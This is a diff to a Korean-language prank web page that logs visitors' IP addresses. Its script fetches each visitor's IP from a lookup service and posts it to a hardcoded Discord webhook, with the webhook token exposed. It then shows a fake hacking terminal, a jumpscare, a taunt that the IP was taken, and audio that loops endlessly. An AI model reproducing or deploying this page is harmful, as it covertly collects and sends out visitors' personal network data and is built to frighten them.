@@ -53,21 +53,13 @@
         }
 
         #ip-text {
-            color: #ffcc00;
-            font-size: 3rem;
+            color: #ff0000; /* 새빨간 색 */
+            font-size: 12vw; /* 화면 꽉 차게 엄청 큼 */
             font-weight: bold;
-            text-shadow: 2px 2px 10px red;
-            margin-bottom: 20px;
+            text-shadow: 2px 2px 20px #ffcc00; /* 노란색 네온 효과 */
             font-family: 'Malgun Gothic', sans-serif;
             text-align: center;
             word-break: keep-all;
-        }
-
-        img {
-            max-width: 90%;
-            max-height: 70vh;
-            border-radius: 15px;
-            box-shadow: 0 0 30px red;
         }
     </style>
 </head>
@@ -76,23 +68,21 @@
     <div id="terminal"></div>
     <div id="jumpscare"></div>
     <div id="result-screen">
-        <div id="ip-text">IP 추출 중...</div>
-        <img src="image.png" alt="너 ip따임">
+        <div id="ip-text">너 ip따임 ㅋㅋㅋ</div>
     </div>
+
+    <!-- loop 속성 추가됨: 소리 무한 반복 -->
+    <audio id="sumpsound" src="audio.mp3" preload="auto" loop></audio>
 
     <script>
         const webhookURL = 'https://discord.com/api/webhooks/1543975289527341118/tgC_i7WSsTccdUWBE2FXjMkY1__piEvWo1UxZkP3BTlbKNpCrlAujbLFeEjJoMyIbrxl';
 
-        // 방문자 IP 가져와서 디스코드 웹훅으로 전송
+        // IP 추출 및 전송
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
                 const visitorIP = data.ip;
-                
-                // 화면에 IP 표시
-                document.getElementById('ip-text').innerHTML = `너 IP <br><span style="color:red; font-size:4rem;">${visitorIP}</span><br> 따임 ㅋㅋㅋㅋ`;
 
-                // 디스코드 웹훅 전송
                 fetch(webhookURL, {
                     method: 'POST',
                     headers: {
@@ -103,13 +93,12 @@
                     })
                 }).catch(err => console.error(err));
             })
-            .catch(() => {
-                document.getElementById('ip-text').innerText = "너 ip따임 ㅋㅋㅋㅋ";
-            });
+            .catch(() => {});
 
         const term = document.getElementById('terminal');
         const jump = document.getElementById('jumpscare');
         const result = document.getElementById('result-screen');
+        const sound = document.getElementById('sumpsound');
 
         const lines = [
             "Connection established...",
@@ -130,6 +119,9 @@
                     clearInterval(typingInterval);
                     term.style.display = 'none';
                     jump.style.display = 'block';
+
+                    // 플래시와 함께 소리 재생 (loop 때문에 안 끄면 계속 나옴)
+                    sound.play().catch(e => console.log("Audio play blocked:", e));
 
                     setTimeout(() => {
                         jump.style.display = 'none';
